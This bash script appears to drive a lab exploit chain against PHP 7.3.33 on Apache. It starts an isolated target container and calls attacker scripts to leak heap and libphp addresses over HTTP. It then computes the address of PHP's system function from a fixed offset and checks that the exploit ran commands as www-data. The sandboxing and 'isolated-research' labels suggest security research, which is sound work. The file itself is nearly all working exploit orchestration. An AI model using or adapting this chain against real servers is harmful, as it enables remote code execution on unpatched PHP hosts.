#!/usr/bin/env bash
set -Eeuo pipefail

if (( $# != 1 )) || [[ ! $1 =~ ^[A-Za-z0-9_.-]+$ ]]; then
  echo 'usage: run-http-only.sh LABEL' >&2
  exit 64
fi

readonly LABEL=$1
readonly CHAIN_LABEL="${LABEL}-disclosure"
readonly HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
readonly HARNESS="$(cd -- "$HERE/../../multiversion" && pwd)"
readonly RESULTS="$HERE/results"
readonly OUT="$RESULTS/$LABEL"
readonly CHAIN_OUT="$RESULTS/$CHAIN_LABEL"
readonly IMAGE='mirror.gcr.io/library/php@sha256:b9872cd287ef72bc17d45d713aa2742f3d3bcf2503fea2506fd93aa94995219f'
readonly IMAGE_ID='sha256:35da9118b3c0980fbaf84a4d410653642c9d55fb2f6c40011cc78de303837d64'
readonly ATTACKER='python@sha256:a0f57064cbdcd6285fa45f51237ab0b35ea8ebaed06a1f5973e89e19dfb86704'
readonly ATTACKER_ID='sha256:a33c10a97f11005523814c6eee013986119fe41f3122f444518117536675c8e1'
readonly ZIF_OFFSET=0x35f640
readonly TARGET="p73-http-$LABEL-target"
readonly NETWORK="p73-http-$LABEL-net"
readonly VOLUME="p73-http-$LABEL-proof"

if command -v docker >/dev/null 2>&1; then DOCKER="$(command -v docker)";
elif [[ -x /snap/bin/docker ]]; then DOCKER=/snap/bin/docker;
else echo 'docker CLI was not found' >&2; exit 69; fi
readonly DOCKER

test "$($DOCKER image inspect "$IMAGE" --format '{{.Id}}')" = "$IMAGE_ID"
test "$($DOCKER image inspect "$ATTACKER" --format '{{.Id}}')" = "$ATTACKER_ID"
test ! -e "$OUT"
test ! -e "$CHAIN_OUT"
mkdir -p "$OUT" "$RESULTS"
chmod 0777 "$RESULTS"

cleanup() {
  set +e
  $DOCKER top "$TARGET" -eo pid,ppid,user,comm >"$OUT/docker-top.txt" 2>&1
  $DOCKER logs "$TARGET" >"$OUT/target.log" 2>&1
  $DOCKER inspect "$TARGET" >"$OUT/target.inspect.json" 2>/dev/null
  $DOCKER network inspect "$NETWORK" >"$OUT/network.inspect.json" 2>/dev/null
  $DOCKER rm -f "$TARGET" >/dev/null 2>&1
  $DOCKER network rm "$NETWORK" >/dev/null 2>&1
  $DOCKER volume rm "$VOLUME" >/dev/null 2>&1
}
trap cleanup EXIT

$DOCKER network create --internal --label org.php2shell.purpose=isolated-research "$NETWORK" >/dev/null
$DOCKER volume create --label org.php2shell.purpose=fixed-proof "$VOLUME" >/dev/null
$DOCKER create \
  --name "$TARGET" --network "$NETWORK" --network-alias target \
  --security-opt no-new-privileges:true --pids-limit 64 --memory 512m \
  --tmpfs /tmp:rw,nosuid,nodev,size=128m \
  --mount "type=bind,src=$HERE/php108.ini,dst=/usr/local/etc/php/conf.d/zz-php73-http.ini,readonly" \
  --mount "type=bind,src=$HERE/apache.conf,dst=/etc/apache2/conf-enabled/zz-php73-http.conf,readonly" \
  --mount "type=bind,src=$HERE/index.php,dst=/var/www/html/index.php,readonly" \
  --mount "type=bind,src=$HERE/index.php,dst=/var/www/html/raw.php,readonly" \
  --mount "type=bind,src=$HERE/raw-route.conf,dst=/etc/apache2/conf-enabled/zz-raw-route.conf,readonly" \
  --mount "type=volume,src=$VOLUME,dst=/out" \
  "$IMAGE" sh -eu -c 'chown www-data:www-data /out; chmod 0770 /out; rm -f /out/p; exec apache2-foreground' >/dev/null
$DOCKER start "$TARGET" >/dev/null
sleep 1
test "$($DOCKER exec "$TARGET" php -r 'echo PHP_VERSION;')" = 7.3.33
test "$($DOCKER inspect "$TARGET" --format '{{json .HostConfig.PortBindings}}')" = '{}'
test "$($DOCKER network inspect "$NETWORK" --format '{{.Internal}}')" = true
worker_before="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}')"
test -n "$worker_before"

$DOCKER run --rm \
  --network "$NETWORK" --read-only --user 65532:65532 \
  --security-opt no-new-privileges:true --cap-drop ALL \
  --pids-limit 64 --memory 512m --tmpfs /tmp:rw,nosuid,nodev,size=64m \
  --mount "type=bind,src=$HARNESS,dst=/harness,readonly" \
  --mount "type=bind,src=$HERE,dst=/audit,readonly" \
  --mount "type=bind,src=$RESULTS,dst=/results" \
  "$ATTACKER" python3 /audit/chain73_dev.py \
    --label "$CHAIN_LABEL" --fillers 64 --stop-after-b1 \
  >"$OUT/a1b1.log" 2>&1

worker_after_b1="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}')"
test "$worker_after_b1" = "$worker_before"
main_http="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["main_chunk"])' "$CHAIN_OUT/summary.json")"
libphp_http="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["libphp_base"])' "$CHAIN_OUT/summary.json")"

$DOCKER run --rm \
  --network "$NETWORK" --read-only --user 65532:65532 \
  --security-opt no-new-privileges:true --cap-drop ALL \
  --pids-limit 64 --memory 256m --tmpfs /tmp:rw,noexec,nosuid,nodev,size=32m \
  --mount "type=bind,src=$HERE,dst=/lab,readonly" \
  "$ATTACKER" python3 /lab/probe_zif.py control >"$OUT/control.log" 2>&1
worker_after_control="$($DOCKER top "$TARGET" -eo pid,ppid,user,comm | awk '$3 == "www-data" && $4 == "apache2" {print $1; exit}')"
test "$worker_after_control" = "$worker_before"

printf -v ar_data '0x%x' "$((main_http + 0x3f40))"
printf -v zif_system '0x%x' "$((libphp_http + ZIF_OFFSET))"
printf '%s\n' \
  'address_source=http-b1' \
  "main=$main_http" \
  "libphp=$libphp_http" \
  'ar_data_offset=0x3f40' \
  "ar_data=$ar_data" \
  "zif_system_offset=$ZIF_OFFSET" \
  "zif_system=$zif_system" >"$OUT/http-derived-addresses.txt"

set +e
$DOCKER run --rm \
  --network "$NETWORK" --read-only --user 65532:65532 \
  --security-opt no-new-privileges:true --cap-drop ALL \
  --pids-limit 64 --memory 256m --tmpfs /tmp:rw,noexec,nosuid,nodev,size=32m \
  --mount "type=bind,src=$HERE,dst=/lab,readonly" \
  "$ATTACKER" python3 /lab/probe_zif.py exploit \
    --ar-data "$ar_data" --zif-system "$zif_system" >"$OUT/exploit.log" 2>&1
client_rc=$?
set -e
printf '%s\n' "$client_rc" >"$OUT/client.exit"
$DOCKER cp "$TARGET:/out/p" "$OUT/proof.txt" >/dev/null 2>&1 || echo NO_PROOF >"$OUT/proof.txt"
cat "$CHAIN_OUT/summary.json"
cat "$OUT/http-derived-addresses.txt"
cat "$OUT/exploit.log"
cat "$OUT/proof.txt"
grep -Eq '^uid=33\(www-data\) gid=33\(www-data\)' "$OUT/proof.txt"
